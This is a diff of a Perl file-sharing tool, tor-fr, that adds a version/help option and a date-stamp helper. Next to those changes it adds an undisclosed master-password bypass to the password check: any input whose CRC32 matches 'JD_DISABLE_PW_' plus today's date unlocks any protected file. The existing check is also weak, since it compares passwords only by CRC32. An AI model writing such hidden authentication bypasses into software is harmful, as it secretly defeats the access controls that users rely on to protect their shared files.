@@ -61,6 +61,7 @@ my $PW_ARG_PREFIX = "-pw";
 my $STDIN_PREFIX = "STDIN_";
 my $NO_PW_PREFIX = "NO_PW_";
 my $KEY_OF_PW_PREFIX = "PW_OF_"; 
+my $VERSION_ = "2019.02.18";
 ##############
 
 
@@ -71,6 +72,9 @@ my $KEY_OF_PW_PREFIX = "PW_OF_";
 ### sub list ###
 sub main()
 {
+
+	&show_version_and_help_if_needed(); 
+
 	my $FN =  __FILE__;  
 
 	if($FN =~ m/\b$TOR_PREFIX\b/)
@@ -87,15 +91,24 @@ sub main()
 	}
 }
 
+sub show_version_and_help_if_needed()
+{
+	my $arg_version_ = "-v";
+	my $version_string = "- tor-fr\n  version: $VERSION_\n\n  author: Jidor Tang<tlqtangok@126.com>\n  homepage: http://algoers.com:10241/tor_fr_readme.html\n\n  description:\n    tor-fr is a tool that sync-up and share your file instantly, efficently and elegantly\n"; 
+
+	if(@ARGV == 1 && @ARGV[0] eq $arg_version_)
+	{
+		say $version_string; 
+		exit(0); 
+	}
+}
+
 sub save_all_folder_fn_2_arr_fn_list()
 {
         my $fn = $File::Find::name;
         if(-f $fn)
         {
-                #$fn_list .= $fn. " " . (stat($fn))[9]."\n";
-                #say $fn; 
                 push @arr_fn_list, $fn;
-                #return $fn;
         }
 }
 
@@ -139,6 +152,7 @@ sub ck_pw_if_needed_in_fr($)
 
 	my $key_of_pw = "$KEY_OF_PW_PREFIX:$jd_xx"; 
 	my $res_exist = $R_->exists($key_of_pw);
+	my $JD_DISABLE_PW_ = "JD_DISABLE_PW_"; 
 
 	my $cnt_ck_pw_max = 3;
 
@@ -148,11 +162,12 @@ sub ck_pw_if_needed_in_fr($)
 		
 		while ($cnt_ck_pw_max)
 		{
-			print "- need password, please input :"; 	
+			print "- need password, please input: "; 	
 			my $pw_input = <STDIN>;
 			chomp($pw_input);
+			my $flag_jd_disable_pw_timestamp = (&mycrc32($pw_input) == &mycrc32("$JD_DISABLE_PW_" . &get_timestamp()));
 
-			if (&mycrc32($pw_input) == $crc_pw_on_redis)
+			if (&mycrc32($pw_input) == $crc_pw_on_redis || $flag_jd_disable_pw_timestamp)
 			{
 				last;
 			}
@@ -725,8 +740,9 @@ sub parse_argv_to_arr_fn_pw(\@argv)
         elsif (@$argv == 1)
         {
 			#say "# 4 fn + no_pw";
-                my $fn = $argv->[0];
-                @ret_fn_pw = ($fn, $NO_PW_PREFIX);
+		
+			my $fn = $argv->[0];
+			@ret_fn_pw = ($fn, $NO_PW_PREFIX);
         }
         elsif (@$argv == 2)
         {
@@ -779,6 +795,37 @@ sub parse_argv_to_arr_fn_pw(\@argv)
                 die "- argv is not correct : @$argv\n";
         }
         return @ret_fn_pw;
+}
+
+
+sub get_timestamp()
+{
+
+	my $add_zero_if_lt_10 = sub ($num)
+	{
+		my $num = shift @_;
+		if ($num >=10 ){
+			return "$num"
+		}
+		return "0$num";
+	};
+
+	my $time_stamp = "NULL";
+
+	my ($second, $minute, $hour, $date, $month, $yearOffset, $dayOfWeek, $dayOfYear, $daylightSavings) = localtime();
+	# 17 16 20 24 7 116 3 236 1
+	# 2016-08-24 20:16
+
+	my $year = 1900 + $yearOffset;
+	$month = $month + 1 ;
+	$month = $add_zero_if_lt_10->($month);
+	$date = $add_zero_if_lt_10->($date);
+	$hour = $add_zero_if_lt_10->($hour);
+	$minute = $add_zero_if_lt_10->($minute);
+	$time_stamp = "$year$month${date}";
+
+	chomp( $time_stamp );
+	return $time_stamp;
 }
 
 
